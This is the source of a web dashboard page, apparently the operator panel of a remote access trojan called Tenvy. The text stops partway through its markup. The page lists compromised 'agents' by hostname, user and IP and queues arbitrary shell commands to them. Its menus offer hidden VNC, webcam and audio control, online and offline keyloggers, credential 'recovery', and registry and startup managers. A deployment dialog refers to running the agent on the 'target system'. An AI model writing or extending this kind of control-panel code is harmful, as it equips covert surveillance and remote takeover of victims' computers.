<script lang="ts">
	import { browser } from '$app/environment';
	import { goto, invalidateAll } from '$app/navigation';
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import {
		Card,
		CardDescription,
		CardFooter,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { ScrollArea } from '$lib/components/ui/scroll-area/index.js';
	import {
		Table,
		TableBody,
		TableCell,
		TableHead,
		TableHeader,
		TableRow
	} from '$lib/components/ui/table/index.js';
	import {
		ContextMenu,
		ContextMenuContent,
		ContextMenuItem,
		ContextMenuSeparator,
		ContextMenuTrigger,
		ContextMenuSub,
		ContextMenuSubContent,
		ContextMenuSubTrigger
	} from '$lib/components/ui/context-menu/index.js';
	import {
		Dialog as DialogRoot,
		DialogContent,
		DialogDescription,
		DialogFooter,
		DialogHeader,
		DialogTitle
	} from '$lib/components/ui/dialog/index.js';
	import {
		Select,
		SelectContent,
		SelectItem,
		SelectTrigger
	} from '$lib/components/ui/select/index.js';
	import ClientToolDialog from '$lib/components/client-tool-dialog.svelte';
	import {
		buildClientToolUrl,
		getClientTool,
		isDialogTool,
		type ClientToolId,
		type DialogToolId
	} from '$lib/data/client-tools';
	import type { Client } from '$lib/data/clients';
	import ChevronLeft from '@lucide/svelte/icons/chevron-left';
	import ChevronRight from '@lucide/svelte/icons/chevron-right';
	import Search from '@lucide/svelte/icons/search';
	import type { AgentSnapshot } from '../../../../../shared/types/agent';

	const statusLabels: Record<AgentSnapshot['status'], string> = {
		online: 'Online',
		offline: 'Offline',
		error: 'Error'
	};

	const statusClasses: Record<AgentSnapshot['status'], string> = {
		online: 'border border-emerald-500/30 bg-emerald-500/10 text-emerald-500',
		offline: 'border border-slate-500/30 bg-slate-500/10 text-slate-400',
		error: 'border border-red-500/30 bg-red-500/10 text-red-500'
	};

	let { data } = $props<{ data: { agents: AgentSnapshot[] } }>();
	const agents = $derived((data.agents ?? []) as AgentSnapshot[]);

	let searchQuery = $state('');
	let statusFilter = $state<'all' | AgentSnapshot['status']>('all');
	let tagFilter = $state<'all' | string>('all');
	let perPage = $state(10);
	let currentPage = $state(1);

	const perPageOptions = [10, 25, 50];

	const sectionToolMap = {
		systemInfo: 'system-info',
		notes: 'notes',
		hiddenVnc: 'hidden-vnc',
		remoteDesktop: 'remote-desktop',
		webcamControl: 'webcam-control',
		audioControl: 'audio-control',
		keyloggerOnline: 'keylogger-online',
		keyloggerOffline: 'keylogger-offline',
		keyloggerAdvanced: 'keylogger-advanced-online',
		cmd: 'cmd',
		fileManager: 'file-manager',
		taskManager: 'task-manager',
		registryManager: 'registry-manager',
		startupManager: 'startup-manager',
		clipboardManager: 'clipboard-manager',
		tcpConnections: 'tcp-connections',
		recovery: 'recovery',
		options: 'options',
		openUrl: 'open-url',
		messageBox: 'message-box',
		clientChat: 'client-chat',
		reportWindow: 'report-window',
		ipGeolocation: 'ip-geolocation',
		environmentVariables: 'environment-variables',
		reconnect: 'reconnect',
		disconnect: 'disconnect',
		shutdown: 'shutdown',
		restart: 'restart',
		sleep: 'sleep',
		logoff: 'logoff'
	} as const satisfies Record<string, ClientToolId>;

	type SectionKey = keyof typeof sectionToolMap;

	let availableTags = $state<string[]>([]);
	let filteredAgents = $state<AgentSnapshot[]>([]);
	let paginatedAgents = $state<AgentSnapshot[]>([]);
	let pageRange = $state({ start: 0, end: 0 });
	let totalPages = $state(1);
	let paginationItems = $state<(number | 'ellipsis')[]>([]);
	let toolDialog = $state<{ agentId: string; toolId: DialogToolId } | null>(null);
	let toolDialogAgent = $derived(findAgentById(toolDialog?.agentId ?? null));
	let toolDialogClient = $derived(toolDialogAgent ? mapAgentToClient(toolDialogAgent) : null);

	$effect(() => {
		if (toolDialog && !toolDialogAgent) {
			toolDialog = null;
		}
	});

	$effect(() => {
		const tags = new Set<string>();
		for (const agent of agents) {
			for (const tag of agent.metadata.tags ?? []) {
				tags.add(tag);
			}
		}
		availableTags = Array.from(tags).sort((a, b) => a.localeCompare(b));
	});

	$effect(() => {
		const query = searchQuery.trim().toLowerCase();

		filteredAgents = agents.filter((agent) => {
			const matchesStatus = statusFilter === 'all' ? true : agent.status === statusFilter;

			const matchesTag =
				tagFilter === 'all'
					? true
					: (agent.metadata.tags?.some((tag) => tag.toLowerCase() === tagFilter.toLowerCase()) ??
						false);

			if (!matchesStatus || !matchesTag) {
				return false;
			}

			if (query === '') {
				return true;
			}

			const haystack = [
				agent.id,
				agent.metadata.hostname,
				agent.metadata.username,
				agent.metadata.os,
				agent.metadata.ipAddress,
				...(agent.metadata.tags ?? [])
			]
				.filter(Boolean)
				.map((value) => value!.toString().toLowerCase());

			return haystack.some((value) => value.includes(query));
		});
	});

	$effect(() => {
		const startIndex = (currentPage - 1) * perPage;
		const slice = filteredAgents.slice(startIndex, startIndex + perPage);
		paginatedAgents = slice;

		const total =
			filteredAgents.length === 0 ? 1 : Math.max(1, Math.ceil(filteredAgents.length / perPage));
		totalPages = total;

		if (filteredAgents.length === 0) {
			pageRange = { start: 0, end: 0 };
		} else {
			const start = startIndex + 1;
			const end = Math.min(start + slice.length - 1, filteredAgents.length);
			pageRange = { start, end };
		}
	});

	$effect(() => {
		searchQuery;
		statusFilter;
		tagFilter;
		perPage;
		currentPage = 1;
	});

	$effect(() => {
		const total = totalPages;
		if (currentPage > total) {
			currentPage = total;
		}
	});

	function buildPaginationItems(
		total: number,
		current: number,
		siblingCount = 1
	): (number | 'ellipsis')[] {
		if (total <= 1) {
			return [1];
		}

		const safeCurrent = Math.min(Math.max(current, 1), total);
		const start = Math.max(2, safeCurrent - siblingCount);
		const end = Math.min(total - 1, safeCurrent + siblingCount);

		const items: (number | 'ellipsis')[] = [1];

		if (start > 2) {
			items.push('ellipsis');
		}

		for (let page = start; page <= end; page += 1) {
			items.push(page);
		}

		if (end < total - 1) {
			items.push('ellipsis');
		}

		items.push(total);

		return items;
	}

	$effect(() => {
		paginationItems = buildPaginationItems(totalPages, currentPage);
	});

	let pingMessages = $state<Record<string, string>>({});
	let shellCommands = $state<Record<string, string>>({});
	let shellTimeouts = $state<Record<string, number | undefined>>({});
	let commandErrors = $state<Record<string, string | null>>({});
	let commandSuccess = $state<Record<string, string | null>>({});
	let commandPending = $state<Record<string, boolean>>({});

	let pingDialogAgentId = $state<string | null>(null);
	let shellDialogAgentId = $state<string | null>(null);
	let pingAgent = $state<AgentSnapshot | null>(null);
	let shellAgent = $state<AgentSnapshot | null>(null);
	let deployDialogOpen = $state(false);

	$effect(() => {
		pingAgent = findAgentById(pingDialogAgentId);
	});

	$effect(() => {
		shellAgent = findAgentById(shellDialogAgentId);
	});

	type CopyFeedback = { message: string; variant: 'success' | 'error' } | null;
	let copyFeedback = $state<CopyFeedback>(null);
	let copyFeedbackTimeout: number | undefined;

	function updateRecord<T>(records: Record<string, T>, key: string, value: T): Record<string, T> {
		return { ...records, [key]: value };
	}

	function formatDate(value: string): string {
		const date = new Date(value);
		if (Number.isNaN(date.getTime())) {
			return 'Unknown';
		}
		return date.toLocaleString();
	}

	function formatRelative(value: string): string {
		const date = new Date(value);
		if (Number.isNaN(date.getTime())) {
			return 'unknown';
		}
		const diffMs = Date.now() - date.getTime();
		if (diffMs <= 0) {
			return 'just now';
		}
		const diffSeconds = Math.floor(diffMs / 1000);
		const units: [Intl.RelativeTimeFormatUnit, number][] = [
			['day', 86_400],
			['hour', 3_600],
			['minute', 60],
			['second', 1]
		];
		for (const [unit, seconds] of units) {
			if (diffSeconds >= seconds || unit === 'second') {
				const value = Math.floor(diffSeconds / seconds) * -1;
				return new Intl.RelativeTimeFormat(undefined, { numeric: 'auto' }).format(value, unit);
			}
		}
		return 'just now';
	}

	function formatBytes(value?: number): string {
		if (!value) {
			return '—';
		}
		const units = ['B', 'KB', 'MB', 'GB', 'TB'];
		let idx = 0;
		let current = value;
		while (current >= 1024 && idx < units.length - 1) {
			current /= 1024;
			idx += 1;
		}
		return `${current.toFixed(idx === 0 ? 0 : 1)} ${units[idx]}`;
	}

	function formatDuration(seconds?: number): string {
		if (!seconds) {
			return '—';
		}
		const hours = Math.floor(seconds / 3600);
		const minutes = Math.floor((seconds % 3600) / 60);
		const secs = Math.floor(seconds % 60);
		const parts = [];
		if (hours > 0) parts.push(`${hours}h`);
		if (minutes > 0 || hours > 0) parts.push(`${minutes}m`);
		parts.push(`${secs}s`);
		return parts.join(' ');
	}

	function findAgentById(agentId: string | null): AgentSnapshot | null {
		if (!agentId) {
			return null;
		}
		return agents.find((agent) => agent.id === agentId) ?? null;
	}

	function getError(key: string): string | null {
		return commandErrors[key] ?? null;
	}

	function getSuccess(key: string): string | null {
		return commandSuccess[key] ?? null;
	}

	function isPending(key: string): boolean {
		return commandPending[key] ?? false;
	}

	async function queueCommand(
		agentId: string,
		body: unknown,
		key: string,
		successMessage: string
	): Promise<boolean> {
		commandPending = updateRecord(commandPending, key, true);
		commandErrors = updateRecord(commandErrors, key, null);
		commandSuccess = updateRecord(commandSuccess, key, null);

		try {
			const response = await fetch(`/api/agents/${agentId}/commands`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(body)
			});
			if (!response.ok) {
				const message = (await response.text()) || 'Failed to queue command';
				commandErrors = updateRecord(commandErrors, key, message.trim());
				return false;
			}
			commandSuccess = updateRecord(commandSuccess, key, successMessage);
			await invalidateAll();
			return true;
		} catch (err) {
			commandErrors = updateRecord(
				commandErrors,
				key,
				err instanceof Error ? err.message : 'Unknown error'
			);
			return false;
		} finally {
			commandPending = updateRecord(commandPending, key, false);
		}
	}

	async function sendPing(agentId: string): Promise<boolean> {
		const key = `ping:${agentId}`;
		const message = pingMessages[agentId]?.trim();
		const success = await queueCommand(
			agentId,
			{
				name: 'ping',
				payload: message ? { message } : {}
			},
			key,
			'Ping queued'
		);
		if (success) {
			pingMessages = updateRecord(pingMessages, agentId, '');
		}
		return success;
	}

	async function sendShell(agentId: string): Promise<boolean> {
		const key = `shell:${agentId}`;
		const command = shellCommands[agentId]?.trim();
		if (!command) {
			commandErrors = updateRecord(commandErrors, key, 'Command is required');
			return false;
		}

		const timeout = shellTimeouts[agentId];
		const payload: { command: string; timeoutSeconds?: number } = { command };
		if (timeout && timeout > 0) {
			payload.timeoutSeconds = timeout;
		}

		const success = await queueCommand(
			agentId,
			{
				name: 'shell',
				payload
			},
			key,
			'Shell command queued'
		);

		if (success) {
			shellCommands = updateRecord(shellCommands, agentId, '');
		}

		return success;
	}

	function openPingDialog(agentId: string) {
		pingDialogAgentId = agentId;
		commandErrors = updateRecord(commandErrors, `ping:${agentId}`, null);
		commandSuccess = updateRecord(commandSuccess, `ping:${agentId}`, null);
	}

	function openShellDialog(agentId: string) {
		shellDialogAgentId = agentId;
		commandErrors = updateRecord(commandErrors, `shell:${agentId}`, null);
		commandSuccess = updateRecord(commandSuccess, `shell:${agentId}`, null);
	}

	function closePingDialog() {
		pingDialogAgentId = null;
	}

	function closeShellDialog() {
		shellDialogAgentId = null;
	}

	async function handlePingSubmit() {
		const agent = findAgentById(pingDialogAgentId);
		if (!agent) return;
		const success = await sendPing(agent.id);
		if (success) {
			closePingDialog();
		}
	}

	async function handleShellSubmit() {
		const agent = findAgentById(shellDialogAgentId);
		if (!agent) return;
		const success = await sendShell(agent.id);
		if (success) {
			closeShellDialog();
		}
	}

	function setCopyFeedback(feedback: CopyFeedback) {
		copyFeedback = feedback;
		if (!browser) {
			return;
		}
		if (copyFeedbackTimeout !== undefined) {
			window.clearTimeout(copyFeedbackTimeout);
		}
		if (feedback) {
			copyFeedbackTimeout = window.setTimeout(() => {
				copyFeedback = null;
				copyFeedbackTimeout = undefined;
			}, 2500);
		}
	}

	async function copyAgentId(agentId: string) {
		if (!browser) return;
		try {
			await navigator.clipboard.writeText(agentId);
			setCopyFeedback({ message: 'Agent ID copied to clipboard', variant: 'success' });
		} catch (err) {
			console.error(err);
			setCopyFeedback({ message: 'Unable to copy agent ID', variant: 'error' });
		}
	}

	function inferClientPlatform(os: string): Client['platform'] {
		const normalized = os.toLowerCase();
		if (normalized.includes('mac')) {
			return 'macos';
		}
		if (normalized.includes('win')) {
			return 'windows';
		}
		return 'linux';
	}

	function mapAgentStatusToClientStatus(status: AgentSnapshot['status']): Client['status'] {
		if (status === 'online') {
			return 'online';
		}
		if (status === 'offline') {
			return 'offline';
		}
		return 'idle';
	}

	function determineClientRisk(status: AgentSnapshot['status']): Client['risk'] {
		return status === 'error' ? 'High' : 'Medium';
	}

	function mapAgentToClient(agent: AgentSnapshot): Client {
		const tags = agent.metadata.tags ?? [];

		return {
			id: agent.id,
			codename: agent.metadata.hostname?.toUpperCase() ?? agent.id.toUpperCase(),
			hostname: agent.metadata.hostname,
			ip: agent.metadata.ipAddress ?? 'Unknown',
			location: 'Unknown',
			os: agent.metadata.os,
			platform: inferClientPlatform(agent.metadata.os),
			version: agent.metadata.version ?? 'Unknown',
			status: mapAgentStatusToClientStatus(agent.status),
			lastSeen: formatRelative(agent.lastSeen),
			tags,
			risk: determineClientRisk(agent.status),
			notes: tags.length > 0 ? `Tags: ${tags.join(', ')}` : undefined
		};
	}

	function openSection(section: SectionKey, agent: AgentSnapshot) {
		const toolId = sectionToolMap[section];
		if (!toolId) {
			return;
		}

		const tool = getClientTool(toolId);
		const target = tool.target ?? '_blank';

		toolDialog = null;

		if (target === 'dialog' && isDialogTool(toolId)) {
			toolDialog = { agentId: agent.id, toolId };
			return;
		}

		const url = buildClientToolUrl(agent.id, tool);

		if (!browser) {
			return;
		}

	if (target === '_self') {
		goto(url);
		return;
	}

	if (target === '_blank') {
		const newWindow = window.open(url, '_blank', 'noopener,noreferrer');

		if (!newWindow) {
			console.warn('Pop-up blocked when attempting to open client tool in a new tab.');
			window.location.assign(url);
			return;
		}

		newWindow.opener = null;
		return;
	}

	window.open(url, target, 'noopener,noreferrer');
}
</script>

<svelte:head>
	<title>Clients · Tenvy</title>
</svelte:head>

<section class="space-y-6">
	{#if agents.length === 0}
		<Card class="border-dashed border-border/60">
			<CardHeader>
				<CardTitle>No agents connected</CardTitle>
				<CardDescription>
					Launch a client instance to have it register and appear here automatically.
				</CardDescription>
			</CardHeader>
			<CardFooter>
				<Button type="button" onclick={() => (deployDialogOpen = true)}>
					View deployment guide
				</Button>
			</CardFooter>
		</Card>
	{/if}

	<div class="space-y-4 rounded-lg border border-border/60 bg-background/60 p-4">
		<div class="grid gap-4 lg:grid-cols-[minmax(0,1.2fr)_minmax(0,1fr)] lg:items-end">
			<div class="flex flex-col gap-2">
				<Label for="client-search" class="text-sm font-medium">Search</Label>
				<div class="relative">
					<Search
						class="pointer-events-none absolute top-1/2 left-3 size-4 -translate-y-1/2 text-muted-foreground"
					/>
					<Input
						id="client-search"
						placeholder="Hostname, user, ID, IP, or tag"
						value={searchQuery}
						oninput={(event) => (searchQuery = event.currentTarget.value)}
						class="pl-10"
					/>
				</div>
			</div>
			<div class="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
				<div class="flex flex-col gap-2">
					<Label for="client-status-filter" class="text-sm font-medium">Status</Label>
					<Select
						type="single"
						value={statusFilter}
						onValueChange={(value) => (statusFilter = value as typeof statusFilter)}
					>
						<SelectTrigger id="client-status-filter" class="w-full">
							<span class="truncate">
								{statusFilter === 'all' ? 'All statuses' : statusLabels[statusFilter]}
							</span>
						</SelectTrigger>
						<SelectContent>
							<SelectItem value="all">All statuses</SelectItem>
							<SelectItem value="online">Online</SelectItem>
							<SelectItem value="offline">Offline</SelectItem>
							<SelectItem value="error">Error</SelectItem>
						</SelectContent>
					</Select>
				</div>
				<div class="flex flex-col gap-2">
					<Label for="client-tag-filter" class="text-sm font-medium">Tag</Label>
					<Select
						type="single"
						value={tagFilter}
						onValueChange={(value) => (tagFilter = value as typeof tagFilter)}
					>
						<SelectTrigger id="client-tag-filter" class="w-full">
							<span class="truncate">
								{tagFilter === 'all' ? 'All tags' : tagFilter}
							</span>
						</SelectTrigger>
						<SelectContent>
							<SelectItem value="all">All tags</SelectItem>
							{#if availableTags.length > 0}
								{#each availableTags as tag (tag)}
									<SelectItem value={tag}>{tag}</SelectItem>
								{/each}
							{:else}
								<SelectItem value="all" disabled>No tags available</SelectItem>
							{/if}
						</SelectContent>
					</Select>
				</div>
				<div class="flex flex-col gap-2">
					<Label for="client-page-size" class="text-sm font-medium">Per page</Label>
					<Select
						type="single"
						value={perPage.toString()}
						onValueChange={(value) => {
							const next = Number.parseInt(value, 10);
							perPage = Number.isNaN(next) ? 10 : next;
						}}
					>
						<SelectTrigger id="client-page-size" class="w-full">
							<span>{perPage} rows</span>
						</SelectTrigger>
						<SelectContent>
							{#each perPageOptions as option (option)}
								<SelectItem value={option.toString()}>{option} rows</SelectItem>
							{/each}
						</SelectContent>
					</Select>
				</div>
			</div>
		</div>
		{#if copyFeedback}
			<p
				class={`text-sm ${
					copyFeedback.variant === 'error' ? 'text-destructive' : 'text-emerald-500'
				}`}
			>
				{copyFeedback.message}
			</p>
		{/if}
	</div>

	<div class="space-y-4">
		<ScrollArea class="rounded-lg border border-border/60">
			<div class="min-w-[960px]">
				<Table>
					<TableHeader>
						<TableRow>
							<TableHead class="w-[22rem]">Agent</TableHead>
							<TableHead class="w-[8rem]">Status</TableHead>
							<TableHead class="w-[12rem]">Connected</TableHead>
							<TableHead class="w-[12rem]">Last seen</TableHead>
							<TableHead class="w-[7rem] text-center">Pending</TableHead>
							<TableHead class="w-[10rem]">Memory</TableHead>
							<TableHead class="w-[9rem]">Uptime</TableHead>
						</TableRow>
					</TableHeader>
					<TableBody>
						{#if paginatedAgents.length === 0}
							<TableRow>
								<TableCell colspan={7} class="py-12 text-center text-sm text-muted-foreground">
									{#if agents.length === 0}
										No agents connected yet.
									{:else}
										No agents match your current filters.
									{/if}
								</TableCell>
							</TableRow>
						{:else}
							{#each paginatedAgents as agent (agent.id)}
								<ContextMenu>
									<ContextMenuTrigger>
										<TableRow class="cursor-context-menu" tabindex={0}>
											<TableCell>
												<div class="flex flex-col gap-2">
													<div class="flex flex-wrap items-center gap-x-3 gap-y-1">
														<span class="font-medium">{agent.metadata.hostname}</span>
														<span class="text-xs text-muted-foreground">
															{agent.metadata.username}@{agent.metadata.os}
														</span>
														{#if agent.metadata.version}
															<Badge variant="outline" class="text-[0.65rem]">
																v{agent.metadata.version}
															</Badge>
														{/if}
													</div>
													<div
														class="flex flex-wrap items-center gap-2 text-xs text-muted-foreground"
													>
														<span>Agent ID: <code>{agent.id}</code></span>
														{#if agent.metadata.ipAddress}
															<span aria-hidden="true">•</span>
															<span>IP {agent.metadata.ipAddress}</span>
														{/if}
													</div>
													{#if agent.metadata.tags?.length}
														<div class="flex flex-wrap gap-2">
															{#each agent.metadata.tags.slice(0, 3) as tag (tag)}
																<Badge variant="outline" class="rounded-md text-[0.65rem]">
																	{tag}
																</Badge>
															{/each}
															{#if agent.metadata.tags.length > 3}
																<Badge variant="outline" class="rounded-md text-[0.65rem]">
																	+{agent.metadata.tags.length - 3}
																</Badge>
															{/if}
														</div>
													{/if}
												</div>
											</TableCell>
											<TableCell>
												<Badge
													class={`rounded-md px-2 py-1 text-xs font-semibold ${statusClasses[agent.status]}`}
												>
													{statusLabels[agent.status]}
												</Badge>
											</TableCell>
											<TableCell class="text-sm text-muted-foreground"
												>{formatDate(agent.connectedAt)}</TableCell
											>
											<TableCell class="text-sm text-muted-foreground"
												>{formatRelative(agent.lastSeen)}</TableCell
											>
											<TableCell class="text-center text-sm font-medium">
												{agent.pendingCommands}
											</TableCell>
											<TableCell class="text-sm text-muted-foreground"
												>{formatBytes(agent.metrics?.memoryBytes)}</TableCell
											>
											<TableCell class="text-sm text-muted-foreground"
												>{formatDuration(agent.metrics?.uptimeSeconds)}</TableCell
											>
										</TableRow>
									</ContextMenuTrigger>
									<ContextMenuContent class="w-56">
										<ContextMenuItem on:select={() => openSection('systemInfo', agent)}>
											System Info
										</ContextMenuItem>
										<ContextMenuItem on:select={() => openSection('notes', agent)}>
											Notes
										</ContextMenuItem>

										<ContextMenuSeparator />

										<ContextMenuSub>
											<ContextMenuSubTrigger>Control</ContextMenuSubTrigger>
											<ContextMenuSubContent class="w-48">
												<ContextMenuItem on:select={() => openSection('hiddenVnc', agent)}>
													Hidden VNC
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('remoteDesktop', agent)}>
													Remote Desktop
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('webcamControl', agent)}>
													Webcam Control
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('audioControl', agent)}>
													Audio Control
												</ContextMenuItem>
												<ContextMenuSub>
													<ContextMenuSubTrigger>Keylogger</ContextMenuSubTrigger>
													<ContextMenuSubContent class="w-48">
														<ContextMenuItem
															on:select={() => openSection('keyloggerOnline', agent)}
														>
															Online
														</ContextMenuItem>
														<ContextMenuItem
															on:select={() => openSection('keyloggerOffline', agent)}
														>
															Offline
														</ContextMenuItem>
														<ContextMenuItem
															on:select={() => openSection('keyloggerAdvanced', agent)}
														>
															Advanced Online
														</ContextMenuItem>
													</ContextMenuSubContent>
												</ContextMenuSub>
												<ContextMenuItem on:select={() => openSection('cmd', agent)}>
													CMD
												</ContextMenuItem>
											</ContextMenuSubContent>
										</ContextMenuSub>

										<ContextMenuSeparator />

										<ContextMenuSub>
											<ContextMenuSubTrigger>Management</ContextMenuSubTrigger>
											<ContextMenuSubContent class="w-48">
												<ContextMenuItem on:select={() => openSection('fileManager', agent)}>
													File Manager
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('taskManager', agent)}>
													Task Manager
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('registryManager', agent)}>
													Registry Manager
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('startupManager', agent)}>
													Startup Manager
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('clipboardManager', agent)}>
													Clipboard Manager
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('tcpConnections', agent)}>
													TCP Connections
												</ContextMenuItem>
											</ContextMenuSubContent>
										</ContextMenuSub>

										<ContextMenuSeparator />

										<ContextMenuItem on:select={() => openSection('recovery', agent)}>
											Recovery
										</ContextMenuItem>
										<ContextMenuItem on:select={() => openSection('options', agent)}>
											Options
										</ContextMenuItem>

										<ContextMenuSeparator />

										<ContextMenuSub>
											<ContextMenuSubTrigger>Miscellaneous</ContextMenuSubTrigger>
											<ContextMenuSubContent class="w-48">
												<ContextMenuItem on:select={() => openSection('openUrl', agent)}>
													Open URL
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('messageBox', agent)}>
													Message Box
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('clientChat', agent)}>
													Client Chat
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('reportWindow', agent)}>
													Report Window
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('ipGeolocation', agent)}>
													IP Geolocation
												</ContextMenuItem>
												<ContextMenuItem
													on:select={() => openSection('environmentVariables', agent)}
												>
													Environment Variables
												</ContextMenuItem>
											</ContextMenuSubContent>
										</ContextMenuSub>

										<ContextMenuSeparator />

										<ContextMenuSub>
											<ContextMenuSubTrigger>System Controls</ContextMenuSubTrigger>
											<ContextMenuSubContent class="w-48">
												<ContextMenuItem on:select={() => openSection('reconnect', agent)}>
													Reconnect
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('disconnect', agent)}>
													Disconnect
												</ContextMenuItem>
											</ContextMenuSubContent>
										</ContextMenuSub>

										<ContextMenuSeparator />

										<ContextMenuSub>
											<ContextMenuSubTrigger>Power</ContextMenuSubTrigger>
											<ContextMenuSubContent class="w-48">
												<ContextMenuItem on:select={() => openSection('shutdown', agent)}>
													Shutdown
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('restart', agent)}>
													Restart
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('sleep', agent)}>
													Sleep
												</ContextMenuItem>
												<ContextMenuItem on:select={() => openSection('logoff', agent)}>
													Logoff
												</ContextMenuItem>
											</ContextMenuSubContent>
										</ContextMenuSub>

										<ContextMenuSeparator />

										<ContextMenuItem on:select={() => copyAgentId(agent.id)}>
											Copy agent ID
										</ContextMenuItem>
									</ContextMenuContent>
								</ContextMenu>
							{/each}
						{/if}
					</TableBody>
				</Table>
			</div>
		</ScrollArea>

		<div class="px-4 text-sm text-muted-foreground">
			{#if filteredAgents.length === 0}
				No agents to display.
			{:else}
				Showing {pageRange.start}–{pageRange.end} of {filteredAgents.length}
				{filteredAgents.length === 1 ? ' agent' : ' agents'}.
			{/if}
		</div>

		{#if filteredAgents.length > 0 && totalPages > 1}
			<nav class="flex justify-center">
				<ul class="flex flex-row items-center gap-1">
					<li>
						<Button
							type="button"
							variant="ghost"
							class="flex h-9 items-center gap-1 px-2.5 sm:pl-2.5"
							onclick={() => (currentPage = Math.max(1, currentPage - 1))}
							disabled={currentPage <= 1}
						>
							<ChevronLeft class="size-4" />
							<span class="sr-only sm:not-sr-only">Previous</span>
						</Button>
					</li>
					{#each paginationItems as item, index}
						<li>
							{#if item === 'ellipsis'}
								<span
									class="flex h-9 w-9 items-center justify-center text-sm text-muted-foreground"
								>
									…
								</span>
							{:else}
								<Button
									type="button"
									variant={item === currentPage ? 'outline' : 'ghost'}
									class="h-9 w-9 px-0"
									onclick={() => (currentPage = item)}
								>
									{item}
								</Button>
							{/if}
						</li>
					{/each}
					<li>
						<Button
							type="button"
							variant="ghost"
							class="flex h-9 items-center gap-1 px-2.5 sm:pl-2.5"
							onclick={() => (currentPage = Math.min(totalPages, currentPage + 1))}
							disabled={currentPage >= totalPages}
						>
							<span class="sr-only sm:not-sr-only">Next</span>
							<ChevronRight class="size-4" />
						</Button>
					</li>
				</ul>
			</nav>
		{/if}
	</div>

	{#if toolDialog && toolDialogAgent && toolDialogClient}
		{#key `${toolDialog.agentId}-${toolDialog.toolId}`}
			<ClientToolDialog
				client={toolDialogClient}
				toolId={toolDialog.toolId}
				on:close={() => (toolDialog = null)}
			/>
		{/key}
	{/if}

	<DialogRoot open={deployDialogOpen} onOpenChange={(value: boolean) => (deployDialogOpen = value)}>
		<DialogContent class="sm:max-w-md">
			<DialogHeader>
				<DialogTitle>Connect an agent</DialogTitle>
				<DialogDescription>
					Generate a deployment command, execute it on the target system, and the agent will appear
					in this list once it connects.
				</DialogDescription>
			</DialogHeader>
			<div class="space-y-3 text-sm text-muted-foreground">
				<p>Install the client binary, provide the controller URL, and confirm network access.</p>
				<p>
					Agents automatically authenticate and begin reporting metrics immediately after launch.
				</p>
			</div>
			<DialogFooter>
				<Button type="button" variant="ghost" onclick={() => (deployDialogOpen = false)}>
					Close
				</Button>
			</DialogFooter>
		</DialogContent>
	</DialogRoot>

	{#if pingAgent}
		<DialogRoot open onOpenChange={(value: boolean) => (!value ? closePingDialog() : null)}>
			<DialogContent class="sm:max-w-md">
				<DialogHeader>
					<DialogTitle>Send ping</DialogTitle>
					<DialogDescription>
						Queue a keep-alive message for {pingAgent.metadata.hostname}.
					</DialogDescription>
				</DialogHeader>
				<div class="space-y-4">
					<div class="space-y-2">
						<Label for="ping-message" class="text-sm font-medium">Message</Label>
						<Input
							id="ping-message"
							placeholder="Optional message"
							value={pingMessages[pingAgent!.id] ?? ''}
							oninput={(event) =>
								(pingMessages = updateRecord(
									pingMessages,
									pingAgent!.id,
									event.currentTarget.value
								))}
						/>
					</div>
					{#if getError(`ping:${pingAgent!.id}`)}
						<p class="text-sm text-destructive">{getError(`ping:${pingAgent!.id}`)}</p>
					{:else if getSuccess(`ping:${pingAgent!.id}`)}
						<p class="text-sm text-emerald-500">{getSuccess(`ping:${pingAgent!.id}`)}</p>
					{/if}
				</div>
				<DialogFooter class="gap-2 sm:justify-between">
					<Button type="button" variant="ghost" onclick={closePingDialog}>Cancel</Button>
					<Button
						type="button"
						onclick={handlePingSubmit}
						disabled={isPending(`ping:${pingAgent!.id}`)}
					>
						{#if isPending(`ping:${pingAgent!.id}`)}
							Sending…
						{:else}
							Queue ping
						{/if}
					</Button>
				</DialogFooter>
			</DialogContent>
		</DialogRoot>
	{/if}

	{#if shellAgent}
		<DialogRoot open onOpenChange={(value: boolean) => (!value ? closeShellDialog() : null)}>
			<DialogContent class="sm:max-w-lg">
				<DialogHeader>
					<DialogTitle>Run shell command</DialogTitle>
					<DialogDescription>
						Dispatch a command for {shellAgent.metadata.hostname} to execute.
					</DialogDescription>
				</DialogHeader>
				<div class="space-y-4">
					<div class="space-y-2">
						<Label for="shell-command" class="text-sm font-medium">Command</Label>
						<textarea
							id="shell-command"
							class="min-h-28 w-full rounded-md border border-border/60 bg-background px-3 py-2 text-sm focus:ring-2 focus:ring-primary focus:outline-none"
							rows={4}
							placeholder="whoami"
							value={shellCommands[shellAgent!.id] ?? ''}
							oninput={(event) =>
								(shellCommands = updateRecord(
									shellCommands,
									shellAgent!.id,
									event.currentTarget.value
								))}
						></textarea>
					</div>
					<div class="grid gap-2 sm:grid-cols-[minmax(0,1fr)_auto] sm:items-center">
						<div class="space-y-2">
							<Label for="shell-timeout" class="text-sm font-medium">Timeout (seconds)</Label>
							<Input
								id="shell-timeout"
								type="number"
								min={1}
								placeholder="Optional timeout"
								value={shellTimeouts[shellAgent!.id] ?? ''}
								oninput={(event) => {
									const raw = event.currentTarget.value;
									const value = Number.parseInt(raw, 10);
									shellTimeouts = updateRecord(
										shellTimeouts,
										shellAgent!.id,
										raw.trim() === '' || Number.isNaN(value) ? undefined : value
									);
								}}
							/>
						</div>
						<p class="text-xs text-muted-foreground">Leave blank to use the agent default.</p>
					</div>
